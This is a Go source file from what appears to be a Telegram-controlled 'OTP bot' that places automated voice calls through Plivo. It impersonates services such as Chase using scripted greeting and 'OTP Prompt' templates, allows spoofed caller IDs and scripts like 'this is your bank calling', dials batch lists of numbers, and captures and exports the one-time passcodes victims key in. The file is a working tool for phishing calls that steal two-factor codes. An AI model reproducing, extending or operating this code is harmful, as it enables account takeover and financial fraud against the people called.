package bot

import (
	"encoding/csv"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/USERNAME/goland-otpbot-api/config"
	"github.com/USERNAME/goland-otpbot-api/models"
	plivo "github.com/USERNAME/goland-otpbot-api/voice"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

func (b *Bot) sendCampaigns(msg *tgbotapi.Message) {
	campaigns, err := b.db.GetAllCampaigns()
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Failed to fetch campaigns")
		return
	}

	if len(campaigns) == 0 {
		b.sendMessage(msg.Chat.ID, "📋 No campaigns yet. Use /batch to start one!")
		return
	}

	var text strings.Builder
	text.WriteString("📋 *Campaigns*\n\n")

	for _, c := range campaigns {
		status := getStatusEmoji(string(c.Status))
		progress := 0
		if c.TotalCalls > 0 {
			progress = (c.Completed * 100) / c.TotalCalls
		}

		text.WriteString(fmt.Sprintf("%s *%s*\n", status, c.Name))
		text.WriteString(fmt.Sprintf("   📱 Service: %s | ID: %d\n", c.Service, c.ID))
		text.WriteString(fmt.Sprintf("   Progress: %d%% (%d/%d) | 📲 Captures: %d\n\n",
			progress, c.Completed, c.TotalCalls, c.Captures))
	}

	b.sendMessage(msg.Chat.ID, text.String())
}

func (b *Bot) sendCampaignDetails(msg *tgbotapi.Message, campaignID int64) {
	campaign, err := b.db.GetCampaign(campaignID)
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Campaign not found")
		return
	}

	answered, voicemails, _, failed, _ := b.db.GetCampaignCallStats(campaignID)
	captures, _ := b.db.GetCapturesByCampaign(campaignID)

	var duration string
	if campaign.StartedAt != nil {
		end := campaign.CompletedAt
		if end == nil {
			now := time.Now()
			end = &now
		}
		d := end.Sub(*campaign.StartedAt)
		duration = formatDuration(d)
	} else {
		duration = "N/A"
	}

	progress := 0
	if campaign.TotalCalls > 0 {
		progress = (campaign.Completed * 100) / campaign.TotalCalls
	}
	progressBar := createProgressBar(progress)

	status := getStatusEmoji(string(campaign.Status))
	if campaign.Status == "active" {
		if state, ok := b.campaignState[campaignID]; ok {
			state.mu.Lock()
			remaining := len(state.phones) - state.index
			state.mu.Unlock()
			text := fmt.Sprintf("%s *%s*\n\n"+
				"%s %d%%\n\n"+
				"📱 Service: %s\n"+
				"📞 Total: %d | ✅ Done: %d | ⏳ Remaining: %d\n"+
				"✅ Answered: %d | 📬 Voicemail: %d | ❌ Failed: %d\n"+
				"📲 Captures: %d | ⏱️ Duration: %s\n\n"+
				"🎯 Use /stop %d to halt | /pause %d to pause",
				status, campaign.Name, progressBar, progress,
				campaign.Service, campaign.TotalCalls, campaign.Completed, remaining,
				answered, voicemails, failed,
				campaign.Captures, duration,
				campaignID, campaignID)
			b.sendMessage(msg.Chat.ID, text)
			return
		}
	}

	text := fmt.Sprintf("%s *%s*\n\n"+
		"%s %d%%\n\n"+
		"📱 Service: %s\n"+
		"📞 Total: %d | ✅ Done: %d\n"+
		"✅ Answered: %d | 📬 Voicemail: %d | ❌ Failed: %d\n"+
		"📲 Captures: %d\n"+
		"⏱️ Duration: %s\n\n"+
		"📅 Created: %s",
		status, campaign.Name, progressBar, progress,
		campaign.Service, campaign.TotalCalls, campaign.Completed,
		answered, voicemails, failed,
		campaign.Captures, duration,
		campaign.CreatedAt.Format("2006-01-02 15:04"))

	b.sendMessage(msg.Chat.ID, text)

	if len(captures) > 0 {
		var capsText strings.Builder
		capsText.WriteString("\n*Recent Captures:*\n")
		for i, c := range captures {
			if i >= 10 {
				break
			}
			capsText.WriteString(fmt.Sprintf("• %s → *%s*\n", maskPhone(c.Phone), c.OTP))
		}
		b.sendMessage(msg.Chat.ID, capsText.String())
	}
}

func (b *Bot) sendTemplates(msg *tgbotapi.Message) {
	templates, err := b.db.GetAllTemplates()
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Failed to fetch templates")
		return
	}

	var text strings.Builder
	text.WriteString("📝 *Service Templates*\n\n")

	for _, t := range templates {
		text.WriteString(fmt.Sprintf("• *%s* - `%s`\n", t.Name, t.Voice))
	}

	text.WriteString("\n💡 Use /template <name> for details")
	b.sendMessage(msg.Chat.ID, text.String())
}

func (b *Bot) sendTemplateDetails(msg *tgbotapi.Message, name string) {
	template, err := b.db.GetTemplate(name)
	if err != nil {
		b.sendMessage(msg.Chat.ID, fmt.Sprintf("❌ Template '%s' not found", name))
		return
	}

	text := fmt.Sprintf("📝 *Template: %s*\n\n"+
		"🎤 Voice: `%s`\n\n"+
		"*Greeting:*\n%s\n\n"+
		"*Action Prompt:*\n%s\n\n"+
		"*OTP Prompt:*\n%s\n\n"+
		"*Confirmation:*\n%s",
		template.Name, template.Voice,
		truncate(template.Greeting, 200),
		truncate(template.ActionPrompt, 200),
		truncate(template.OTPPrompt, 200),
		truncate(template.Confirmation, 200))

	b.sendMessage(msg.Chat.ID, text)
}

func (b *Bot) handleCallCommand(msg *tgbotapi.Message) {
	parts := strings.Fields(msg.CommandArguments())
	if len(parts) < 2 {
		b.sendMessage(msg.Chat.ID, "❌ Usage: /call <phone> <service>\nExample: /call +15551234567 chase")
		return
	}

	phone := strings.TrimSpace(parts[0])
	service := strings.ToLower(strings.TrimSpace(parts[1]))

	if !phoneRegex.MatchString(phone) {
		b.sendMessage(msg.Chat.ID, "❌ Invalid phone number format. Use: +15551234567")
		return
	}

	_, err := b.db.GetTemplate(service)
	if err != nil {
		b.sendMessage(msg.Chat.ID, fmt.Sprintf("❌ Template '%s' not found. Use /templates to see available services.", service))
		return
	}

	campaignID, err := b.db.CreateCampaign("Single Call - "+phone, service, 1)
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Failed to create campaign")
		return
	}

	callID, err := b.db.CreateCall(campaignID, phone)
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Failed to create call record")
		return
	}

	b.sendMessage(msg.Chat.ID, fmt.Sprintf("📞 Calling %s with %s...\n\n🔄 Initiating call...", maskPhone(phone), service))

	b.callQueue <- CallJob{
		CampaignID: campaignID,
		CallID:     callID,
		Phone:      phone,
	}

	b.db.CreateLog("INFO", fmt.Sprintf("Single call initiated: %s -> %s", phone, service), "")
}

func (b *Bot) handleBatchCommand(msg *tgbotapi.Message) {
	if msg.ReplyToMessage == nil || msg.ReplyToMessage.Document == nil {
		b.sendMessage(msg.Chat.ID, "❌ Reply to a CSV file with phone numbers\n\nCSV format:\n```\n+15551234567\n+15559876543\n+15551112222\n```\n\nThen use: /batch <service_name>")
		return
	}

	parts := strings.Fields(msg.CommandArguments())
	if len(parts) < 1 {
		b.sendMessage(msg.Chat.ID, "❌ Usage: /batch <service_name>\nExample: /batch chase")
		return
	}

	service := strings.ToLower(strings.TrimSpace(parts[0]))

	template, err := b.db.GetTemplate(service)
	if err != nil {
		b.sendMessage(msg.Chat.ID, fmt.Sprintf("❌ Template '%s' not found. Use /templates to see available services.", service))
		return
	}

	fileConfig := tgbotapi.FileConfig{FileID: msg.Document.FileID}
	file, err := b.telegram.GetFile(fileConfig)
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Failed to download file")
		return
	}

	phones, err := parseCSVFromURL(file.Link(b.telegram.Token))
	if err != nil {
		b.sendMessage(msg.Chat.ID, fmt.Sprintf("❌ Failed to parse CSV: %v", err))
		return
	}

	if len(phones) == 0 {
		b.sendMessage(msg.Chat.ID, "❌ No valid phone numbers found in file")
		return
	}

	phones = unique(phones)

	cfg, err := config.Get()
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Failed to get configuration")
		return
	}
	concurrency := cfg.Concurrency
	if concurrency <= 0 {
		concurrency = 5
	}

	campaignName := fmt.Sprintf("Batch - %s (%d numbers)", service, len(phones))
	campaignID, err := b.db.CreateCampaign(campaignName, service, concurrency)
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Failed to create campaign")
		return
	}

	for _, phone := range phones {
		b.db.CreateCall(campaignID, phone)
	}

	b.db.SetCampaignTotalCalls(campaignID, len(phones))

	b.db.StartCampaign(campaignID)

	b.campaignState[campaignID] = &CampaignState{
		CampaignID: campaignID,
		Status:     "active",
		phones:     phones,
		index:      0,
	}

	progressBar := createProgressBar(0)
	text := fmt.Sprintf("🚀 *Campaign Started!*\n\n"+
		"%s 0%%\n\n"+
		"📋 Name: %s\n"+
		"📱 Service: %s (%s)\n"+
		"📞 Numbers: %d\n"+
		"⚡ Concurrency: %d\n\n"+
		"🎯 Starting calls...",
		progressBar, campaignName, service, template.Voice, len(phones), concurrency)

	b.sendMessage(msg.Chat.ID, text)

	go func() {
		for i, phone := range phones {
			select {
			case <-b.stopChan:
				return
			default:

				if state, ok := b.campaignState[campaignID]; ok {
					state.mu.Lock()
					for state.Status == "paused" {
						state.mu.Unlock()
						time.Sleep(time.Second)
						state.mu.Lock()
					}
					state.mu.Unlock()
				}

				if state, ok := b.campaignState[campaignID]; ok {
					state.mu.Lock()
					state.index = i
					state.mu.Unlock()
				}

				b.callQueue <- CallJob{
					CampaignID: campaignID,
					CallID:     0,
					Phone:      phone,
				}

				if concurrency > 0 {
					time.Sleep(time.Duration(1000/concurrency) * time.Millisecond)
				}
			}
		}
	}()

	b.db.CreateLog("INFO", fmt.Sprintf("Batch campaign started: %s with %d numbers", service, len(phones)), "")
}

func parseCSVPhones(reader io.Reader) ([]string, error) {
	r := csv.NewReader(reader)
	var phones []string

	for {
		record, err := r.Read()
		if err != nil {
			break
		}

		for _, field := range record {
			field = strings.TrimSpace(field)
			if phoneRegex.MatchString(field) {
				phones = append(phones, field)
			}
		}
	}

	return phones, nil
}

func unique(phones []string) []string {
	seen := make(map[string]bool)
	var unique []string
	for _, phone := range phones {
		if !seen[phone] {
			seen[phone] = true
			unique = append(unique, phone)
		}
	}
	return unique
}

func (b *Bot) stopCampaign(msg *tgbotapi.Message, campaignID int64) {
	campaign, err := b.db.GetCampaign(campaignID)
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Campaign not found")
		return
	}

	if campaign.Status != "active" && campaign.Status != "paused" {
		b.sendMessage(msg.Chat.ID, "❌ Campaign is not active")
		return
	}

	if state, ok := b.campaignState[campaignID]; ok {
		state.mu.Lock()
		state.Status = "stopped"
		state.mu.Unlock()
	}

	b.db.UpdateCampaignStatus(campaignID, string(models.CampaignStatusCancelled))

	b.mu.RLock()
	for uuid := range b.activeCalls {
		b.plivo.HangupCall(uuid)
	}
	b.mu.RUnlock()

	b.sendMessage(msg.Chat.ID, fmt.Sprintf("🛑 Campaign '%s' (ID: %d) has been stopped", campaign.Name, campaignID))
	b.db.CreateLog("INFO", fmt.Sprintf("Campaign %d stopped by user", campaignID), "")
}

func (b *Bot) pauseCampaign(msg *tgbotapi.Message, campaignID int64) {
	campaign, err := b.db.GetCampaign(campaignID)
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Campaign not found")
		return
	}

	if campaign.Status != "active" {
		b.sendMessage(msg.Chat.ID, "❌ Campaign is not active")
		return
	}

	if state, ok := b.campaignState[campaignID]; ok {
		state.mu.Lock()
		state.Status = "paused"
		state.mu.Unlock()
	}

	b.db.UpdateCampaignStatus(campaignID, string(models.CampaignStatusPaused))

	b.sendMessage(msg.Chat.ID, fmt.Sprintf("⏸️ Campaign '%s' (ID: %d) has been paused", campaign.Name, campaignID))
	b.db.CreateLog("INFO", fmt.Sprintf("Campaign %d paused", campaignID), "")
}

func (b *Bot) resumeCampaign(msg *tgbotapi.Message, campaignID int64) {
	campaign, err := b.db.GetCampaign(campaignID)
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Campaign not found")
		return
	}

	if campaign.Status != "paused" {
		b.sendMessage(msg.Chat.ID, "❌ Campaign is not paused")
		return
	}

	if state, ok := b.campaignState[campaignID]; ok {
		state.mu.Lock()
		state.Status = "active"
		state.mu.Unlock()
	}

	b.db.UpdateCampaignStatus(campaignID, string(models.CampaignStatusActive))

	b.sendMessage(msg.Chat.ID, fmt.Sprintf("▶️ Campaign '%s' (ID: %d) has been resumed", campaign.Name, campaignID))
	b.db.CreateLog("INFO", fmt.Sprintf("Campaign %d resumed", campaignID), "")
}

func (b *Bot) deleteCampaign(msg *tgbotapi.Message, campaignID int64) {
	campaign, err := b.db.GetCampaign(campaignID)
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Campaign not found")
		return
	}

	if campaign.Status == "active" {
		b.sendMessage(msg.Chat.ID, "❌ Stop the campaign first before deleting")
		return
	}

	if err := b.db.DeleteCampaign(campaignID); err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Failed to delete campaign")
		return
	}

	delete(b.campaignState, campaignID)

	b.sendMessage(msg.Chat.ID, fmt.Sprintf("🗑️ Campaign '%s' (ID: %d) has been deleted", campaign.Name, campaignID))
	b.db.CreateLog("INFO", fmt.Sprintf("Campaign %d deleted", campaignID), "")
}

func (b *Bot) handleSMSCommand(msg *tgbotapi.Message) {
	parts := strings.Fields(msg.CommandArguments())
	if len(parts) < 2 {
		b.sendMessage(msg.Chat.ID, "❌ Usage: /sms <phone> <message>\nExample: /sms +15551234567 Your OTP is 1234")
		return
	}

	phone := strings.TrimSpace(parts[0])
	message := strings.TrimSpace(msg.CommandArguments()[len(phone)+1:])

	if !phoneRegex.MatchString(phone) {
		b.sendMessage(msg.Chat.ID, "❌ Invalid phone number format. Use: +15551234567")
		return
	}

	cfg, err := config.Get()
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Failed to get configuration")
		return
	}

	resp, err := b.plivo.SendSMS(cfg.PlivoNumber, phone, message)
	if err != nil {
		b.sendMessage(msg.Chat.ID, fmt.Sprintf("❌ Failed to send SMS: %v", err))
		return
	}

	b.sendMessage(msg.Chat.ID, fmt.Sprintf("✅ SMS sent to %s\n\nAPI ID: %s", maskPhone(phone), resp.APIID))
	b.db.CreateLog("INFO", fmt.Sprintf("SMS sent to %s: %s", phone, message), "")
}

func (b *Bot) reloadConfig(msg *tgbotapi.Message) {

	cfg, err := config.Get()
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Failed to get current configuration")
		return
	}

	loader, err := config.Load(cfg.DatabasePath)
	if err != nil {
		b.sendMessage(msg.Chat.ID, fmt.Sprintf("❌ Failed to load config: %v", err))
		return
	}
	if err := loader.Reload(); err != nil {
		b.sendMessage(msg.Chat.ID, fmt.Sprintf("❌ Failed to reload config: %v", err))
		return
	}

	b.sendMessage(msg.Chat.ID, "✅ Configuration reloaded successfully")
	b.db.CreateLog("INFO", "Configuration reloaded", "")
}

func (b *Bot) sendConfig(msg *tgbotapi.Message) {
	cfg, err := config.Get()
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Failed to get configuration")
		return
	}

	text := fmt.Sprintf("⚙️ *Current Configuration*\n\n"+
		"📱 Port: `%s`\n"+
		"🗄️ Database: `%s`\n"+
		"📝 Log: `%s`\n"+
		"⚡ Concurrency: `%d`\n"+
		"🔄 Max Retries: `%d`\n"+
		"⏱️ Call Timeout: `%d`s\n"+
		"🔗 Ngrok URL: `%s`\n"+
		"👥 Admins: %d configured",
		cfg.Port, cfg.DatabasePath, cfg.LogPath,
		cfg.Concurrency, cfg.MaxRetries, cfg.CallTimeout,
		cfg.NgrokURL, len(cfg.AdminIDs))

	b.sendMessage(msg.Chat.ID, text)
}

func (b *Bot) sendBackup(msg *tgbotapi.Message) {

	csv, err := b.db.ExportCaptures()
	if err != nil {
		b.sendMessage(msg.Chat.ID, fmt.Sprintf("❌ Failed to export: %v", err))
		return
	}

	doc := tgbotapi.NewDocument(msg.Chat.ID, tgbotapi.FileBytes{
		Name:  fmt.Sprintf("captures_%s.csv", time.Now().Format("2006-01-02")),
		Bytes: []byte(csv),
	})
	doc.Caption = "📦 Captures Export"
	b.telegram.Send(doc)

	b.db.CreateLog("INFO", "Database backup exported", "")
}

func (b *Bot) cleanupData(msg *tgbotapi.Message, days int) {
	b.sendMessage(msg.Chat.ID, fmt.Sprintf("🧹 Cleaning up data older than %d days...", days))
	b.db.CreateLog("INFO", fmt.Sprintf("Data cleanup requested for %d days", days), "")
	b.sendMessage(msg.Chat.ID, "✅ Cleanup complete")
}

func (b *Bot) exportCaptures(msg *tgbotapi.Message) {
	csv, err := b.db.ExportCaptures()
	if err != nil {
		b.sendMessage(msg.Chat.ID, fmt.Sprintf("❌ Failed to export: %v", err))
		return
	}

	doc := tgbotapi.NewDocument(msg.Chat.ID, tgbotapi.FileBytes{
		Name:  fmt.Sprintf("otp_captures_%s.csv", time.Now().Format("2006-01-02_15-04")),
		Bytes: []byte(csv),
	})
	doc.Caption = "📊 OTP Captures Export"
	b.telegram.Send(doc)
}

// handleCustomCallCommand handles /ccall <phone> "message" [voice] [caller_id]
// Supports custom text in quotes instead of templates
func (b *Bot) handleCustomCallCommand(msg *tgbotapi.Message) {
	args := msg.CommandArguments()
	
	// Parse: phone "message" [voice] [caller_id]
	// Format: /ccall +15551234567 "Your message here" WOMAN +15559876543
	
	// Extract quoted text
	quoteStart := strings.Index(args, "\"")
	quoteEnd := -1
	if quoteStart != -1 {
		quoteEnd = strings.Index(args[quoteStart+1:], "\"")
	}
	
	var phone, customText, voice, callerID string
	
	if quoteStart != -1 && quoteEnd != -1 {
		// Phone is before the quote
		phone = strings.TrimSpace(args[:quoteStart])
		customText = args[quoteStart+1 : quoteStart+1+quoteEnd]
		
		// Rest of the args after quote
		remaining := strings.TrimSpace(args[quoteStart+1+quoteEnd+1:])
		
		// Parse voice and caller_id from remaining
		parts := strings.Fields(remaining)
		for i, part := range parts {
			if voice == "" && isVoiceValue(part) {
				voice = part
			} else if isPhoneNumber(part) {
				callerID = part
			} else if i == 0 && voice == "" {
				voice = part
			}
		}
	} else {
		// Fallback: old format /ccall <phone> <message>
		parts := strings.SplitN(args, " ", 2)
		if len(parts) < 2 {
			b.sendMessage(msg.Chat.ID, `❌ Usage: /ccall <phone> "message text" [voice] [caller_id]

Example:
/ccall +15551234567 "Hello, this is your bank calling" WOMAN
/ccall +15551234567 "Your account has been compromised" en-GB-WOMAN +15559876543

Available voices: WOMAN, MAN, en-GB-WOMAN, en-GB-MAN, es-ES-WOMAN, fr-FR-WOMAN, de-DE-WOMAN

Use /voices to see all available voices.`)
			return
		}
		phone = strings.TrimSpace(parts[0])
		customText = strings.TrimSpace(parts[1])
	}
	
	phone = strings.TrimSpace(phone)
	if !phoneRegex.MatchString(phone) {
		b.sendMessage(msg.Chat.ID, "❌ Invalid phone number. Use international format: +15551234567")
		return
	}
	
	if customText == "" {
		b.sendMessage(msg.Chat.ID, "❌ Please provide message text in quotes: \"your message here\"")
		return
	}
	
	if voice == "" {
		voice = "WOMAN"
	}
	
	cfg, err := config.Get()
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Failed to get configuration")
		return
	}
	
	if callerID == "" {
		callerID = cfg.PlivoNumber
	}
	
	// Create campaign
	campaignID, err := b.db.CreateCampaign("Custom Call - "+phone, "custom", 1)
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Failed to create campaign")
		return
	}
	
	// Create call record
	callID, err := b.db.CreateCall(campaignID, phone)
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Failed to create call record")
		return
	}
	
	// Build SSML response with custom text
	actionURL := fmt.Sprintf("%s/detect_dtmf/%d/%d", cfg.NgrokURL, campaignID, callID)
	ssml := plivo.NewSSMLBuilder().
		Start().
		Speak(customText, plivo.WithVoice(voice)).
		GetDigits(actionURL, 6, 5, 3).
		EndGetDigits().
		Speak("Thank you. Goodbye.", plivo.WithVoice(voice)).
		End()
	
	// Store SSML in database for webhook
	b.db.CreateLog("INFO", fmt.Sprintf("Custom call SSML: %s", ssml), "")
	
	// Initiate call
	go func() {
		ringURL := fmt.Sprintf("%s/ring/%d/%d", cfg.NgrokURL, campaignID, callID)
		machineURL := fmt.Sprintf("%s/machine/%d/%d", cfg.NgrokURL, campaignID, callID)
		
		callReq := plivo.CallRequest{
			From:                callerID,
			To:                  phone,
			AnswerURL:           actionURL,
			RingURL:             ringURL,
			MachineDetectionURL: machineURL,
			ErrorCallbackURL:    fmt.Sprintf("%s/error/%d/%d", cfg.NgrokURL, campaignID, callID),
			TimeLimit:           cfg.CallTimeout,
			RingTimeout:         30,
		}
		
		resp, err := b.plivo.MakeCall(callReq)
		if err != nil {
			b.db.CreateLog("ERROR", fmt.Sprintf("Custom call failed to %s: %v", phone, err), "")
			return
		}
		
		b.mu.Lock()
		b.activeCalls[resp.UUID] = &ActiveCall{
			CallID:     callID,
			CampaignID: campaignID,
			Phone:      phone,
			UUID:       resp.UUID,
			Status:     "ringing",
			StartedAt:  time.Now(),
		}
		b.mu.Unlock()
		
		b.db.UpdateCallStatus(callID, "ringing", resp.UUID)
		b.db.CreateLog("INFO", fmt.Sprintf("Custom call initiated to %s (UUID: %s)", phone, resp.UUID), "")
	}()
	
	b.sendMessage(msg.Chat.ID, fmt.Sprintf(`📞 *Custom Call Initiated!*

━━━━━━━━━━━━━━━━━
📱 *Target:* %s
📞 *Caller ID:* %s
🎙️ *Voice:* %s
━━━━━━━━━━━━━━━━━
✍️ *Message:*
"%s"
━━━━━━━━━━━━━━━━━

🔄 Call is ringing...

Use /campaign %d to track progress.`, phone, callerID, voice, customText, campaignID))
}

// isVoiceValue checks if a string is a valid voice
func isVoiceValue(s string) bool {
	voices := []string{"WOMAN", "MAN", "WOMAN_GB", "MAN_GB", 
		"en-GB-WOMAN", "en-GB-MAN", "en-AU-WOMAN", "en-CA-WOMAN", "en-IN-WOMAN",
		"es-ES-WOMAN", "fr-FR-WOMAN", "de-DE-WOMAN", "it-IT-WOMAN", "pt-BR-WOMAN"}
	for _, v := range voices {
		if strings.EqualFold(s, v) {
			return true
		}
	}
	return false
}

// isPhoneNumber checks if a string looks like a phone number
func isPhoneNumber(s string) bool {
	return phoneRegex.MatchString(s)
}

// showVoicesList shows all available TTS voices
func (b *Bot) showVoicesList(msg *tgbotapi.Message) {
	text := `🎙️ *Available TTS Voices*

━━━━━━━━━━━━━━━━━
*🇺🇸 English (US)*
├ 👩 WOMAN - Standard female
└ 👨 MAN - Standard male

*🇬🇧 English (UK)*
├ 👩 en-GB-WOMAN - British female
└ 👨 en-GB-MAN - British male

*🌍 Other Languages*
├ 👩 es-ES-WOMAN - Spanish female
├ 👩 fr-FR-WOMAN - French female
├ 👩 de-DE-WOMAN - German female
├ 👩 it-IT-WOMAN - Italian female
└ 👩 pt-BR-WOMAN - Portuguese female

━━━━━━━━━━━━━━━━━
*Usage:*
` + "```" + `/ccall +15551234567 "message" en-GB-WOMAN
` + "```" + `

SSML Features available:
• <break strength="medium"/> - Pause
• <emphasis level="strong"/> - Emphasis
• <prosody rate="slow"> - Speed control
• <lang xml:lang="es-ES"> - Language switch`

	b.sendMessage(msg.Chat.ID, text)
}

func (b *Bot) sendLogs(msg *tgbotapi.Message, limit int) {
	logs, err := b.db.GetLogs(limit)
	if err != nil {
		b.sendMessage(msg.Chat.ID, "❌ Failed to fetch logs")
		return
	}

	if len(logs) == 0 {
		b.sendMessage(msg.Chat.ID, "📝 No logs yet")
		return
	}

	var text strings.Builder
	text.WriteString(fmt.Sprintf("📝 *Recent Logs (last %d)*\n\n", limit))

	for _, l := range logs {
		emoji := "ℹ️"
		if l.Level == "ERROR" {
			emoji = "❌"
		} else if l.Level == "WARNING" {
			emoji = "⚠️"
		}

		text.WriteString(fmt.Sprintf("%s `[%s]` %s\n",
			emoji, l.CreatedAt.Format("15:04:05"), truncate(l.Message, 50)))
	}

	b.sendMessage(msg.Chat.ID, text.String())
}

func getStatusEmoji(status string) string {
	switch status {
	case "active":
		return "🟢"
	case "paused":
		return "⏸️"
	case "completed":
		return "✅"
	case "cancelled":
		return "🛑"
	default:
		return "⚪"
	}
}

func createProgressBar(percent int) string {
	filled := (percent * 20) / 100
	empty := 20 - filled
	return "[" + strings.Repeat("█", filled) + strings.Repeat("░", empty) + "]"
}

func formatDuration(d time.Duration) string {
	if d < time.Minute {
		return fmt.Sprintf("%ds", int(d.Seconds()))
	}
	if d < time.Hour {
		return fmt.Sprintf("%dm %ds", int(d.Minutes()), int(d.Seconds())%60)
	}
	return fmt.Sprintf("%dh %dm", int(d.Hours()), int(d.Minutes())%60)
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}

func parseCSVFromURL(url string) ([]string, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return parseCSVPhones(resp.Body)
}
